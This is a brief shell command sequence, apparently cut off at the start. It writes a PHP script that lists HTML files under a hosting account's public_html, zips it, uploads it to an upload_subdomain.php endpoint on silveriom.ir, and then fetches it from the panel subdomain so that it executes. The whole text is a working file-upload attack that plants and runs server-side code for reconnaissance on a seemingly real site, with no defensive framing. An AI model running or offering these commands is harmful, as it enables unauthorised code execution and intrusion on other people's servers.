<?php echo implode("\n", glob('/home/h417440/public_html/*.html')); EOF
zip -r ls_root.zip ls_root.php
curl -s -X POST -F "file=@ls_root.zip" https://silveriom.ir/upload_subdomain.php
curl -s "https://panel.silveriom.ir/ls_root.php"